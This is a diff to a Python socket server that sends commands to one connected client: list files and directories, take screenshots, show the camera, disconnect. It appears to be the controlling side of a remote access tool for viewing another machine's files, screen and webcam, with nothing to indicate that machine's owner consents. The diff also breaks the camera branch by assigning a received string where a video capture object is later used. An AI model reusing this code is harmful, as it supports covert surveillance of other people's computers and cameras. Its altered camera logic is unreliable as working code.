@@ -14,6 +14,7 @@ sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 host = socket.gethostbyname(socket.gethostname())
 opensocket = True
 
+format_ = 'utf-8'
 port = 25565
 ss_num = 0
 w_num = 0
@@ -36,12 +37,12 @@ print('''
 # Connect to client
 sock.bind((host, port))
 print("Success: binded host and port (" + host + ":" + str(port) + ")")
-print("Server is running on " + host)
-print("Awaiting incoming connections")
-
+print("Server is starting, please wait")
 sock.listen(1)
 connection, address = sock.accept()
 print(str(address) + " has connected to the server")
+print("Awaiting incoming connections")
+print("Server is running on " + host)
 
 # Commands
 def add_command(command):
@@ -64,15 +65,13 @@ while opensocket:
 
     elif command == "list":
         add_command("list")
-        files = connection.recv(5000)
-        files = files.decode()
+        files = connection.recv(5000).decode()
         print(files)
 
     elif command == "listfrom":
         add_command("listfrom")
         fromdir = input(str("What directory would you like to list the files from? "))
-        files = connection.recv(5000)
-        files = files.decode()
+        files = connection.recv(5000).decode()
         print(files)
 
     elif command == "screenshot":
@@ -82,10 +81,10 @@ while opensocket:
         ss.save("screenshot_" + str(ss_num) + ".png")
         ss_num = ss_num + 1
 
-    elif command == "endsession":
-        add_command("endsession")
+    elif command == "disconnect":
+        add_command("disconnect")
         opensocket = False
-        sock.close()
+        connection.close()
         
     elif command == "showcamera":
         add_command("showcamera")
@@ -95,7 +94,7 @@ while opensocket:
         from PIL import Image, ImageTk
 
         width, height = 800, 600
-        cap = cv2.VideoCapture(0)
+        cap = connection.recv(64).decode()
         if not cap.isOpened():
             raise Exception("Could not open video device")
         cap.set(cv2.CAP_PROP_FRAME_WIDTH, width)
